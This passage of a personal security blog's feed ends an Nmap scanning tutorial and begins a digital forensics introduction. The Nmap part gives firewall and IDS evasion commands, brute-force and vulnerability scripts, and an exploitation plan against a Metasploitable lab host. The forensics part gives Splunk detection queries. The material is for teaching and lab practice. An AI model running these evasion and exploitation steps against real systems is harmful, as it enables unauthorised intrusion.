+<h1 id="extract-just-open-ports-with-grep" tabindex="-1">Extract just open ports with grep: <a class="direct-link" href="#extract-just-open-ports-with-grep" aria-hidden="true">#</a></h1>
+<p>grep -oP '\d+(?=/tcp\s+open)' scan_grepable.txt | tr '\n' ','</code></pre></p>
+</div>
+<h2 id="timing-and-performance" tabindex="-1">Timing &amp; Performance <a class="direct-link" href="#timing-and-performance" aria-hidden="true">#</a></h2>
+<p>Nmap's timing templates control how fast or slow it scans. Faster scans are noisier and more likely to be detected or blocked. Slower scans are stealthier but take longer. Choose based on your situation.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">Timing Templates</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code># Timing templates: -T0 (slowest/stealthiest) to -T5 (fastest/loudest)
+<h1 id="t0-paranoid-ids-evasion-very-slow" tabindex="-1">T0 — Paranoid (IDS evasion, very slow): <a class="direct-link" href="#t0-paranoid-ids-evasion-very-slow" aria-hidden="true">#</a></h1>
+<p>nmap -T0 192.168.56.102</p>
+<h1 id="sends-one-probe-every-5-minutes" tabindex="-1">Sends one probe every 5 minutes <a class="direct-link" href="#sends-one-probe-every-5-minutes" aria-hidden="true">#</a></h1>
+<h1 id="t1-sneaky-ids-evasion-slow" tabindex="-1">T1 — Sneaky (IDS evasion, slow): <a class="direct-link" href="#t1-sneaky-ids-evasion-slow" aria-hidden="true">#</a></h1>
+<p>nmap -T1 192.168.56.102</p>
+<h1 id="t2-polite-low-bandwidth-impact" tabindex="-1">T2 — Polite (low bandwidth impact): <a class="direct-link" href="#t2-polite-low-bandwidth-impact" aria-hidden="true">#</a></h1>
+<p>nmap -T2 192.168.56.102</p>
+<h1 id="t3-normal-default" tabindex="-1">T3 — Normal (default): <a class="direct-link" href="#t3-normal-default" aria-hidden="true">#</a></h1>
+<p>nmap -T3 192.168.56.102</p>
+<h1 id="t4-aggressive-recommended-for-lab-ctf" tabindex="-1">T4 — Aggressive (recommended for lab/CTF): <a class="direct-link" href="#t4-aggressive-recommended-for-lab-ctf" aria-hidden="true">#</a></h1>
+<p>nmap -T4 192.168.56.102</p>
+<h1 id="t5-insane-fastest-may-miss-ports-on-slow-networks" tabindex="-1">T5 — Insane (fastest, may miss ports on slow networks): <a class="direct-link" href="#t5-insane-fastest-may-miss-ports-on-slow-networks" aria-hidden="true">#</a></h1>
+<p>nmap -T5 192.168.56.102</p>
+<h1 id="manual-rate-control" tabindex="-1">Manual rate control: <a class="direct-link" href="#manual-rate-control" aria-hidden="true">#</a></h1>
+<p>nmap --min-rate 5000 192.168.56.102    # At least 5000 packets/sec<br>
+nmap --max-rate 100 192.168.56.102     # At most 100 packets/sec</p>
+<h1 id="parallelism" tabindex="-1">Parallelism: <a class="direct-link" href="#parallelism" aria-hidden="true">#</a></h1>
+<p>nmap --min-parallelism 100 192.168.56.102<br>
+nmap --max-parallelism 10 192.168.56.102</p>
+<h1 id="timeout-control" tabindex="-1">Timeout control: <a class="direct-link" href="#timeout-control" aria-hidden="true">#</a></h1>
+<p>nmap --host-timeout 30s 192.168.56.102  # Give up on host after 30 seconds</code></pre></p>
+</div>
+<h2 id="firewall-evasion-techniques" tabindex="-1">Firewall Evasion Techniques <a class="direct-link" href="#firewall-evasion-techniques" aria-hidden="true">#</a></h2>
+<p>In real engagements, firewalls, IDS, and WAFs may be blocking or detecting your scans. Nmap has several built-in techniques to reduce detection and bypass basic filtering.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">Firewall Evasion</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code># Fragment packets (split into smaller pieces, bypass simple firewalls):
+sudo nmap -f 192.168.56.102
+<h1 id="use-decoys-makes-scan-appear-to-come-from-multiple-ips" tabindex="-1">Use decoys (makes scan appear to come from multiple IPs): <a class="direct-link" href="#use-decoys-makes-scan-appear-to-come-from-multiple-ips" aria-hidden="true">#</a></h1>
+<p>sudo nmap -D RND:10 192.168.56.102</p>
+<h1 id="d-rnd-10-use-10-random-decoy-ips" tabindex="-1">-D RND:10 = use 10 random decoy IPs <a class="direct-link" href="#d-rnd-10-use-10-random-decoy-ips" aria-hidden="true">#</a></h1>
+<h1 id="specific-decoys" tabindex="-1">Specific decoys: <a class="direct-link" href="#specific-decoys" aria-hidden="true">#</a></h1>
+<p>sudo nmap -D 10.10.10.1,10.10.10.2,ME 192.168.56.102</p>
+<h1 id="me-your-real-ip-mixed-in-with-decoys" tabindex="-1">ME = your real IP mixed in with decoys <a class="direct-link" href="#me-your-real-ip-mixed-in-with-decoys" aria-hidden="true">#</a></h1>
+<h1 id="spoof-source-port-bypass-port-based-firewall-rules" tabindex="-1">Spoof source port (bypass port-based firewall rules): <a class="direct-link" href="#spoof-source-port-bypass-port-based-firewall-rules" aria-hidden="true">#</a></h1>
+<p>sudo nmap --source-port 53 192.168.56.102</p>
+<h1 id="many-firewalls-allow-dns-port-53-traffic-through" tabindex="-1">Many firewalls allow DNS (port 53) traffic through <a class="direct-link" href="#many-firewalls-allow-dns-port-53-traffic-through" aria-hidden="true">#</a></h1>
+<h1 id="slow-scan-to-avoid-rate-based-ids-detection" tabindex="-1">Slow scan to avoid rate-based IDS detection: <a class="direct-link" href="#slow-scan-to-avoid-rate-based-ids-detection" aria-hidden="true">#</a></h1>
+<p>nmap -T1 --scan-delay 2s 192.168.56.102</p>
+<h1 id="idle-scan-completely-hide-your-ip-using-a-zombie-host" tabindex="-1">Idle scan (completely hide your IP using a zombie host): <a class="direct-link" href="#idle-scan-completely-hide-your-ip-using-a-zombie-host" aria-hidden="true">#</a></h1>
+<p>sudo nmap -sI ZOMBIE_IP 192.168.56.102</p>
+<h1 id="requires-finding-a-suitable-zombie-host-first" tabindex="-1">Requires finding a suitable zombie host first <a class="direct-link" href="#requires-finding-a-suitable-zombie-host-first" aria-hidden="true">#</a></h1>
+<h1 id="mtu-manipulation" tabindex="-1">MTU manipulation: <a class="direct-link" href="#mtu-manipulation" aria-hidden="true">#</a></h1>
+<p>sudo nmap --mtu 16 192.168.56.102</p>
+<h1 id="randomise-host-order-less-predictable-scanning-pattern" tabindex="-1">Randomise host order (less predictable scanning pattern): <a class="direct-link" href="#randomise-host-order-less-predictable-scanning-pattern" aria-hidden="true">#</a></h1>
+<p>nmap --randomize-hosts 192.168.56.0/24</p>
+<h1 id="append-random-data-to-packets" tabindex="-1">Append random data to packets: <a class="direct-link" href="#append-random-data-to-packets" aria-hidden="true">#</a></h1>
+<p>sudo nmap --data-length 25 192.168.56.102</code></pre></p>
+</div>
+<div class="callout callout-warn">
+  <i class="fa-solid fa-triangle-exclamation" aria-hidden="true"></i>
+  <div>
+    <div class="callout-title">Evasion in Real Engagements</div>
+    <div class="callout-body">Evasion techniques are only ethical and legal during authorised penetration tests. Using them without permission is not just illegal — it's the kind of activity that gets professionals fired and prosecuted. In your home lab, use freely.</div>
+  </div>
+</div>
+<h2 id="professional-scanning-workflow" tabindex="-1">Professional Scanning Workflow <a class="direct-link" href="#professional-scanning-workflow" aria-hidden="true">#</a></h2>
+<p>This is the exact workflow I use on every target — lab or CTF. It's a two-phase approach: fast first, thorough second.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">Phase 1 — Fast Discovery (run first)</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code># Phase 1: Fast all-port scan — find WHAT is open
+sudo nmap -sS -p- --min-rate 5000 -T4 192.168.56.102 -oN phase1_fast.txt
+<h1 id="extract-open-ports-from-output" tabindex="-1">Extract open ports from output: <a class="direct-link" href="#extract-open-ports-from-output" aria-hidden="true">#</a></h1>
+<p>open_ports=$(grep &quot;^[0-9]&quot; phase1_fast.txt | cut -d'/' -f1 | tr '\n' ',' | sed 's/,$//')<br>
+echo &quot;Open ports: $open_ports&quot;</p>
+<h1 id="example-21-22-23-25-80-139-445-3306-5432-8180" tabindex="-1">Example: 21,22,23,25,80,139,445,3306,5432,8180</code></pre> <a class="direct-link" href="#example-21-22-23-25-80-139-445-3306-5432-8180" aria-hidden="true">#</a></h1>
+</div>
+<div class="code-block-wrap">
+  <span class="code-block-label">Phase 2 — Deep Scan on Open Ports Only</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code># Phase 2: Deep scan on discovered ports only
+sudo nmap -sV -sC -O -A -p $open_ports 192.168.56.102 -oA phase2_deep
+<h1 id="breakdown-of-flags" tabindex="-1">Breakdown of flags: <a class="direct-link" href="#breakdown-of-flags" aria-hidden="true">#</a></h1>
+<h1 id="sv-service-version-detection" tabindex="-1">-sV  = service version detection <a class="direct-link" href="#sv-service-version-detection" aria-hidden="true">#</a></h1>
+<h1 id="sc-default-nse-scripts" tabindex="-1">-sC  = default NSE scripts <a class="direct-link" href="#sc-default-nse-scripts" aria-hidden="true">#</a></h1>
+<h1 id="o-os-detection" tabindex="-1">-O   = OS detection <a class="direct-link" href="#o-os-detection" aria-hidden="true">#</a></h1>
+<h1 id="a-aggressive-version-scripts-os-traceroute" tabindex="-1">-A   = aggressive (version + scripts + OS + traceroute) <a class="direct-link" href="#a-aggressive-version-scripts-os-traceroute" aria-hidden="true">#</a></h1>
+<h1 id="oa-save-all-output-formats" tabindex="-1">-oA  = save all output formats <a class="direct-link" href="#oa-save-all-output-formats" aria-hidden="true">#</a></h1>
+<h1 id="this-gives-you" tabindex="-1">This gives you: <a class="direct-link" href="#this-gives-you" aria-hidden="true">#</a></h1>
+<h1 id="exact-software-versions-for-cve-lookup" tabindex="-1">- Exact software versions (for CVE lookup) <a class="direct-link" href="#exact-software-versions-for-cve-lookup" aria-hidden="true">#</a></h1>
+<h1 id="os-identification" tabindex="-1">- OS identification <a class="direct-link" href="#os-identification" aria-hidden="true">#</a></h1>
+<h1 id="default-script-results-anonymous-ftp-smb-shares-etc" tabindex="-1">- Default script results (anonymous FTP, SMB shares, etc.) <a class="direct-link" href="#default-script-results-anonymous-ftp-smb-shares-etc" aria-hidden="true">#</a></h1>
+<h1 id="banner-grabbing-for-every-service" tabindex="-1">- Banner grabbing for every service</code></pre> <a class="direct-link" href="#banner-grabbing-for-every-service" aria-hidden="true">#</a></h1>
+</div>
+<div class="code-block-wrap">
+  <span class="code-block-label">Phase 3 — Targeted Vulnerability Checks</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code># Phase 3: Run targeted vuln scripts based on Phase 2 findings
+<h1 id="if-smb-139-445-is-open" tabindex="-1">If SMB (139/445) is open: <a class="direct-link" href="#if-smb-139-445-is-open" aria-hidden="true">#</a></h1>
+<p>sudo nmap --script smb-vuln-ms17-010,smb-vuln-ms08-067,smb-enum-shares,smb-enum-users -p 139,445 192.168.56.102 -oN smb_scan.txt</p>
+<h1 id="if-http-80-443-8080-is-open" tabindex="-1">If HTTP (80/443/8080) is open: <a class="direct-link" href="#if-http-80-443-8080-is-open" aria-hidden="true">#</a></h1>
+<p>sudo nmap --script http-title,http-headers,http-methods,http-enum,http-sql-injection -p 80,443,8080 192.168.56.102 -oN web_scan.txt</p>
+<h1 id="if-ftp-21-is-open" tabindex="-1">If FTP (21) is open: <a class="direct-link" href="#if-ftp-21-is-open" aria-hidden="true">#</a></h1>
+<p>sudo nmap --script ftp-anon,ftp-bounce,ftp-vsftpd-backdoor -p 21 192.168.56.102 -oN ftp_scan.txt</p>
+<h1 id="if-ssh-22-is-open" tabindex="-1">If SSH (22) is open: <a class="direct-link" href="#if-ssh-22-is-open" aria-hidden="true">#</a></h1>
+<p>sudo nmap --script ssh-auth-methods,ssh2-enum-algos -p 22 192.168.56.102 -oN ssh_scan.txt</p>
+<h1 id="if-mysql-3306-is-open" tabindex="-1">If MySQL (3306) is open: <a class="direct-link" href="#if-mysql-3306-is-open" aria-hidden="true">#</a></h1>
+<p>sudo nmap --script mysql-info,mysql-empty-password,mysql-enum -p 3306 192.168.56.102 -oN mysql_scan.txt</code></pre></p>
+</div>
+<h2 id="reading-nmap-output-like-a-pro" tabindex="-1">Reading Nmap Output Like a Pro <a class="direct-link" href="#reading-nmap-output-like-a-pro" aria-hidden="true">#</a></h2>
+<p>Here's a complete Nmap output from Metasploitable 2 with annotations explaining what each finding means and what to do next.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">Annotated Metasploitable 2 Output</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code>Starting Nmap 7.94 at 2026-07-10 14:22 PKT
+Nmap scan report for 192.168.56.102
+Host is up (0.00045s latency).    ← Very fast = local network, host is alive
+<p>PORT     STATE SERVICE     VERSION<br>
+21/tcp   open  ftp         vsftpd 2.3.4<br>
+| ftp-anon: Anonymous FTP login allowed    ← CRITICAL: open to anyone<br>
+| ftp-vsftpd-backdoor:                     ← CRITICAL: CVE-2011-2523<br>
+|   VULNERABLE: vsftpd 2.3.4 backdoor</p>
+<p>22/tcp   open  ssh         OpenSSH 4.7p1<br>
+| ssh-hostkey:<br>
+|   RSA 8bytes...                          ← Old key, check for weak algos</p>
+<p>23/tcp   open  telnet      Linux telnetd  ← HIGH: unencrypted protocol<br>
+← All traffic visible in Wireshark</p>
+<p>25/tcp   open  smtp        Postfix smtpd  ← Check for open relay</p>
+<p>80/tcp   open  http        Apache httpd 2.2.8<br>
+| http-title: Metasploitable2 - Linux     ← Very old Apache (2.2.8 = 2008!)<br>
+| http-methods: GET HEAD POST OPTIONS<br>
+| http-enum:                              ← Directories found:<br>
+|   /dvwa/: DVWA v1.0.7<br>
+|   /phpmyadmin/: phpMyAdmin<br>
+|   /tikiwiki/: TikiWiki CMS</p>
+<p>139/tcp  open  netbios-ssn Samba smbd 3.X<br>
+445/tcp  open  netbios-ssn Samba smbd 3.X ← Check: smb-vuln-ms17-010</p>
+<p>3306/tcp open  mysql       MySQL 5.0.51a  ← Very old MySQL<br>
+| mysql-empty-password:                   ← CRITICAL: root has no password!<br>
+|   root account has empty password</p>
+<p>5432/tcp open  postgresql  PostgreSQL DB<br>
+8180/tcp open  http        Apache Tomcat  ← Default credentials common</p>
+<p>OS: Linux 2.6.9 - 2.6.33              ← Old kernel, check kernel exploits</p>
+<p>← ACTION PLAN from this scan:<br>
+← 1. vsftpd backdoor → msfconsole → exploit/unix/ftp/vsftpd_234_backdoor<br>
+← 2. MySQL empty root → mysql -u root -h 192.168.56.102<br>
+← 3. Anonymous FTP → ftp 192.168.56.102 → user:anonymous<br>
+← 4. Telnet → telnet 192.168.56.102 → try msfadmin:msfadmin<br>
+← 5. phpMyAdmin → browser → try default creds → root / (empty)</code></pre></p>
+</div>
+<h2 id="quick-reference-cheatsheet" tabindex="-1">Quick Reference Cheatsheet <a class="direct-link" href="#quick-reference-cheatsheet" aria-hidden="true">#</a></h2>
+<p>Save this — it covers 90% of what you'll use Nmap for in real engagements.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">Nmap Cheatsheet — Save This</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code># ═══ HOST DISCOVERY ═══
+nmap -sn 192.168.56.0/24                    # Ping sweep
+nmap -sn -iL targets.txt                    # From file
+sudo nmap -PR 192.168.56.0/24              # ARP scan (most reliable LAN)
+nmap -Pn 192.168.56.102                     # Skip ping, scan anyway
+<h1 id="port-scanning" tabindex="-1">═══ PORT SCANNING ═══ <a class="direct-link" href="#port-scanning" aria-hidden="true">#</a></h1>
+<p>nmap 192.168.56.102                         # Top 1000 ports<br>
+nmap -p- 192.168.56.102                     # All 65535 ports<br>
+nmap -p 22,80,443,3306 192.168.56.102      # Specific ports<br>
+nmap -F 192.168.56.102                      # Fast (top 100)<br>
+sudo nmap -sS 192.168.56.102               # SYN scan (stealth)<br>
+sudo nmap -sU 192.168.56.102               # UDP scan<br>
+nmap -sT 192.168.56.102                     # TCP connect (no root)</p>
+<h1 id="detection" tabindex="-1">═══ DETECTION ═══ <a class="direct-link" href="#detection" aria-hidden="true">#</a></h1>
+<p>nmap -sV 192.168.56.102                     # Service versions<br>
+sudo nmap -O 192.168.56.102                # OS detection<br>
+nmap -sV -sC 192.168.56.102               # Versions + default scripts<br>
+sudo nmap -A 192.168.56.102               # Aggressive (all detection)</p>
+<h1 id="professional-workflow" tabindex="-1">═══ PROFESSIONAL WORKFLOW ═══ <a class="direct-link" href="#professional-workflow" aria-hidden="true">#</a></h1>
+<p>sudo nmap -sS -p- --min-rate 5000 TARGET -oN fast.txt          # Phase 1<br>
+sudo nmap -sV -sC -O -A -p PORTS TARGET -oA deep               # Phase 2</p>
+<h1 id="nse-scripts" tabindex="-1">═══ NSE SCRIPTS ═══ <a class="direct-link" href="#nse-scripts" aria-hidden="true">#</a></h1>
+<p>nmap --script vuln TARGET                   # All vuln scripts<br>
+nmap --script smb-vuln-ms17-010 -p 445 TARGET  # EternalBlue check<br>
+nmap --script ftp-anon -p 21 TARGET        # Anonymous FTP<br>
+nmap --script http-enum -p 80 TARGET       # Web directories<br>
+nmap --script ssh-brute -p 22 TARGET       # SSH brute force</p>
+<h1 id="output" tabindex="-1">═══ OUTPUT ═══ <a class="direct-link" href="#output" aria-hidden="true">#</a></h1>
+<p>nmap TARGET -oN output.txt                  # Normal text<br>
+nmap TARGET -oX output.xml                  # XML (Metasploit import)<br>
+nmap TARGET -oG output.gnmap               # Grepable<br>
+nmap TARGET -oA all_formats                 # All three at once</p>
+<h1 id="timing" tabindex="-1">═══ TIMING ═══ <a class="direct-link" href="#timing" aria-hidden="true">#</a></h1>
+<p>nmap -T4 TARGET                             # Fast (lab/CTF)<br>
+nmap -T1 TARGET                             # Slow (IDS evasion)<br>
+nmap --min-rate 5000 TARGET                 # Force rate</p>
+<h1 id="evasion" tabindex="-1">═══ EVASION ═══ <a class="direct-link" href="#evasion" aria-hidden="true">#</a></h1>
+<p>sudo nmap -f TARGET                        # Fragment packets<br>
+sudo nmap -D RND:10 TARGET                 # Random decoys<br>
+sudo nmap --source-port 53 TARGET          # Spoof source port</code></pre></p>
+</div>
+<blockquote>
+<p>Nmap is not magic. Every number in the output represents a real packet sent and a real response received. Once you understand TCP/IP, reading Nmap output feels like reading a conversation between your machine and the target.</p>
+</blockquote>
+<div class="callout callout-success">
+  <i class="fa-solid fa-circle-check" aria-hidden="true"></i>
+  <div>
+    <div class="callout-title">What to Do After Scanning</div>
+    <div class="callout-body">Take every version number from your Nmap output and search it on: <strong>SearchSploit</strong> (<code>searchsploit vsftpd 2.3.4</code>), <strong>NVD</strong> (nvd.nist.gov), and <strong>ExploitDB</strong> (exploit-db.com). This turns a list of open ports into a prioritised attack plan.</div>
+  </div>
+</div>
+]]></content>
+    <author>
+      <name>Aimad Ul Islam</name>
+    </author>
+    
+      
+    <category term="Cybersecurity"/>
+      
+    <category term="Networking"/>
+      
+    <category term="Tutorials"/>
+      
+    
+    
+    
+    <media:thumbnail url="https://i.postimg.cc/hPyNdGVF/Whats-App-Image-2026-07-05-at-9-35-59-PM.jpg"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Digital Forensics &amp; Incident Response: A Hands-On Introduction</title>
+    <link href="https://aimadulislam.dpdns.org/posts/dfir-introduction/"/>
+    <updated>2026-07-05T00:00:00.000Z</updated>
+    <id>https://aimadulislam.dpdns.org/posts/dfir-introduction/</id>
+    <summary type="html"><![CDATA[Windows forensics, memory analysis, Splunk, and Velociraptor — what I learned from BlueCapeSecurity DFIR certification.]]></summary>
+    <content type="html"><![CDATA[<h2 id="introduction" tabindex="-1">Introduction <a class="direct-link" href="#introduction" aria-hidden="true">#</a></h2>
+<p>When a security breach occurs, the attackers leave digital footprints. Digital Forensics and Incident Response (DFIR) is the discipline of finding those footprints, preserving the evidence, and understanding exactly how the adversary operated so you can stop them and prevent future attacks.</p>
+<p>This guide is a write-up of everything I learned during my <strong>BlueCapeSecurity DFIR Foundations &amp; Techniques</strong> certification. It covers the core tools and methodologies — from capturing memory dumps to hunting for malicious artifacts with Velociraptor.</p>
+<div class="callout callout-info">
+  <i class="fa-solid fa-circle-info" aria-hidden="true"></i>
+  <div>
+    <div class="callout-title">My DFIR Certification</div>
+    <div class="callout-body">This content is based on the professional training I completed through <strong>BlueCapeSecurity</strong>, covering the full incident response lifecycle, evidence acquisition, chain of custody, memory forensics, log analysis, and malware triage.</div>
+  </div>
+</div>
+<div class="callout callout-warn">
+  <i class="fa-solid fa-triangle-exclamation" aria-hidden="true"></i>
+  <div>
+    <div class="callout-title">Ethical & Legal Reminder</div>
+    <div class="callout-body">The techniques shown here must only be used on systems you own or have explicit written permission to test. Unauthorized forensic activity is a criminal offence in almost all jurisdictions.</div>
+  </div>
+</div>
+<h2 id="what-is-dfir" tabindex="-1">What is DFIR? <a class="direct-link" href="#what-is-dfir" aria-hidden="true">#</a></h2>
+<p>DFIR is a combination of two disciplines: <strong>Digital Forensics</strong> and <strong>Incident Response</strong>. While often used interchangeably, they serve different purposes:</p>
+<ul>
+<li><strong>Digital Forensics:</strong> The scientific process of preserving, collecting, analyzing, and presenting digital evidence in a legally admissible manner. Think of it as the post-mortem investigation.</li>
+<li><strong>Incident Response:</strong> The operational process of detecting a breach, containing the threat, eradicating the root cause, and recovering normal operations. Think of it as the emergency room triage.</li>
+</ul>
+<p>Effective DFIR requires a blend of both: you need to stop the bleeding (IR) while preserving the evidence to understand the root cause (Forensics).</p>
+<h2 id="the-dfir-mindset-order-of-volatility" tabindex="-1">The DFIR Mindset: Order of Volatility <a class="direct-link" href="#the-dfir-mindset-order-of-volatility" aria-hidden="true">#</a></h2>
+<p>One of the first rules in digital forensics is the <strong>Order of Volatility</strong>. This is the order in which you must collect evidence, starting with the most volatile (short-lived) data to the least volatile.</p>
+<p>The standard order is:</p>
+<ol>
+<li><strong>Registers &amp; Cache</strong> (CPU)</li>
+<li><strong>Memory (RAM)</strong></li>
+<li><strong>Network State</strong> (Active connections, routing tables)</li>
+<li><strong>Running Processes</strong></li>
+<li><strong>Disk</strong> (Hard drive, SSD)</li>
+<li><strong>Archival Backups</strong></li>
+</ol>
+<p>If you shut down a compromised computer to take an image of the hard drive, you lose the <em>memory</em> — which often contains running malicious processes, network connections, and encryption keys. That is why <strong>memory forensics</strong> is so vital.</p>
+<h2 id="tool-1-volatility-memory-forensics" tabindex="-1">Tool 1: Volatility (Memory Forensics) <a class="direct-link" href="#tool-1-volatility-memory-forensics" aria-hidden="true">#</a></h2>
+<p>Volatility is the industry-standard framework for memory forensics. It analyzes a raw memory dump (usually a <code>.vmem</code> or <code>.raw</code> file) to extract running processes, open network connections, loaded drivers, and injected code.</p>
+<p>During the BlueCapeSecurity training, we practiced with several essential Volatility commands.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">Volatility 3 Basic Commands</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code># 1. Identify the operating system profile (Windows 10/11, Server, etc.)
+vol -f memdump.mem windows.info
+<h1 id="2-list-running-processes-look-for-hidden-injected-ones" tabindex="-1">2. List running processes (look for hidden/injected ones) <a class="direct-link" href="#2-list-running-processes-look-for-hidden-injected-ones" aria-hidden="true">#</a></h1>
+<p>vol -f memdump.mem windows.psscan<br>
+vol -f memdump.mem windows.pstree</p>
+<h1 id="3-check-for-malicious-code-injection" tabindex="-1">3. Check for malicious code injection <a class="direct-link" href="#3-check-for-malicious-code-injection" aria-hidden="true">#</a></h1>
+<p>vol -f memdump.mem windows.malfind</p>
+<h1 id="4-dump-a-suspicious-process-for-static-analysis" tabindex="-1">4. Dump a suspicious process for static analysis <a class="direct-link" href="#4-dump-a-suspicious-process-for-static-analysis" aria-hidden="true">#</a></h1>
+<p>vol -f memdump.mem windows.dumpfiles --pid 1234 --dump</p>
+<h1 id="5-scan-for-network-connections" tabindex="-1">5. Scan for network connections <a class="direct-link" href="#5-scan-for-network-connections" aria-hidden="true">#</a></h1>
+<p>vol -f memdump.mem windows.netscan</p>
+<h1 id="6-retrieve-command-line-history" tabindex="-1">6. Retrieve command-line history <a class="direct-link" href="#6-retrieve-command-line-history" aria-hidden="true">#</a></h1>
+<p>vol -f memdump.mem windows.cmdline</code></pre></p>
+</div>
+Memory forensics is incredibly powerful. Malware that actively runs in memory can be detected here before it even touches the disk, making it the first line of defense in a live response.
+<h2 id="tool-2-autopsy-disk-forensics" tabindex="-1">Tool 2: Autopsy (Disk Forensics) <a class="direct-link" href="#tool-2-autopsy-disk-forensics" aria-hidden="true">#</a></h2>
+<p>Autopsy is an open-source, graphical forensic tool built on The Sleuth Kit. It is used to analyze disk images (created via tools like <code>FTK Imager</code>).</p>
+<p>With Autopsy, you can:</p>
+<ul>
+<li>Recover deleted files (from the Recycle Bin or master file table).</li>
+<li>Analyze the file system timeline (when a file was created, modified, or accessed).</li>
+<li>Perform keyword searches across the entire disk.</li>
+<li>Extract web browsing history, email artifacts, and user account data.</li>
+</ul>
+<div class="code-block-wrap">
+  <span class="code-block-label">FTK Imager (disk imaging) & Autopsy workflow</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code># 1. Capture a forensic image of a compromised drive using FTK Imager
+# (Select "Create Disk Image" -> Physical Drive -> Source Drive)
+<h1 id="2-load-the-e01-or-img-file-into-autopsy" tabindex="-1">2. Load the .E01 or .img file into Autopsy <a class="direct-link" href="#2-load-the-e01-or-img-file-into-autopsy" aria-hidden="true">#</a></h1>
+<h1 id="file-new-case-select-the-evidence-source-e01-img" tabindex="-1">File -&gt; New Case -&gt; Select the Evidence Source (.E01/.img) <a class="direct-link" href="#file-new-case-select-the-evidence-source-e01-img" aria-hidden="true">#</a></h1>
+<h1 id="3-ingest-the-image-with-modules" tabindex="-1">3. Ingest the image with modules: <a class="direct-link" href="#3-ingest-the-image-with-modules" aria-hidden="true">#</a></h1>
+<h1 id="file-type-analysis-identify-unknown-malicious-files" tabindex="-1">- File Type Analysis (identify unknown/malicious files) <a class="direct-link" href="#file-type-analysis-identify-unknown-malicious-files" aria-hidden="true">#</a></h1>
+<h1 id="timeline-analysis-look-at-file-modifications-around-the-breach-time" tabindex="-1">- Timeline Analysis (look at file modifications around the breach time) <a class="direct-link" href="#timeline-analysis-look-at-file-modifications-around-the-breach-time" aria-hidden="true">#</a></h1>
+<h1 id="keyword-search-look-for-domain-names-ips-password-etc" tabindex="-1">- Keyword Search (look for domain names, IPs, &quot;password&quot;, etc.) <a class="direct-link" href="#keyword-search-look-for-domain-names-ips-password-etc" aria-hidden="true">#</a></h1>
+<h1 id="4-export-suspicious-files-for-further-analysis" tabindex="-1">4. Export suspicious files for further analysis</code></pre> <a class="direct-link" href="#4-export-suspicious-files-for-further-analysis" aria-hidden="true">#</a></h1>
+</div>
+<h2 id="tool-3-splunk-log-analysis" tabindex="-1">Tool 3: Splunk (Log Analysis) <a class="direct-link" href="#tool-3-splunk-log-analysis" aria-hidden="true">#</a></h2>
+<p>Splunk is a SIEM (Security Information and Event Management) powerhouse. It ingests massive amounts of log data (from Windows Event Logs, firewalls, servers, network devices) and allows you to search, correlate, and visualize the data.</p>
+<p>During the DFIR training, we learned to use Splunk to detect anomalies and build a timeline of the attack based on log artifacts.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">Splunk Search Queries for Detection</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code># 1. Search for multiple failed logon events (Brute Force)
+index=windows EventCode=4625
+| stats count by Account_Name, Source_Network_Address
+| where count > 5
+<h1 id="2-search-for-process-creation-events-suspicious-powershell-or-cmd" tabindex="-1">2. Search for process creation events (Suspicious PowerShell or cmd) <a class="direct-link" href="#2-search-for-process-creation-events-suspicious-powershell-or-cmd" aria-hidden="true">#</a></h1>
+<p>index=windows EventCode=4688<br>
+| where Image LIKE &quot;%powershell%&quot; OR CommandLine LIKE &quot;%Invoke-Expression%&quot;<br>
+| table TimeCreated, User, CommandLine, Image</p>
+<h1 id="3-search-for-new-service-creation-persistence-mechanism" tabindex="-1">3. Search for new service creation (Persistence mechanism) <a class="direct-link" href="#3-search-for-new-service-creation-persistence-mechanism" aria-hidden="true">#</a></h1>
+<p>index=windows EventCode=4697<br>
+| table TimeCreated, ServiceName, ImagePath</p>
+<h1 id="4-identify-unusual-outbound-network-connections" tabindex="-1">4. Identify unusual outbound network connections <a class="direct-link" href="#4-identify-unusual-outbound-network-connections" aria-hidden="true">#</a></h1>
+<p>index=firewall or index=sysmon<br>
+| where dest_ip != &quot;10.0.0.0/8&quot; AND dest_ip != &quot;192.168.0.0/16&quot;</code></pre></p>
+</div>
+<h2 id="tool-4-velociraptor-endpoint-detection" tabindex="-1">Tool 4: Velociraptor (Endpoint Detection) <a class="direct-link" href="#tool-4-velociraptor-endpoint-detection" aria-hidden="true">#</a></h2>
+<p>Velociraptor is an advanced endpoint monitoring and EDR (Endpoint Detection and Response) platform. It is open-source and allows you to perform <strong>hunts</strong> across thousands of endpoints simultaneously.</p>
+<p>You can write custom VQL (Velociraptor Query Language) to collect specific artifacts from machines without installing agents on every single one.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">Velociraptor VQL Hunting Queries</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code># 1. List all running processes across the fleet
+SELECT Name, Pid, CommandLine, Exe
+FROM pslist()
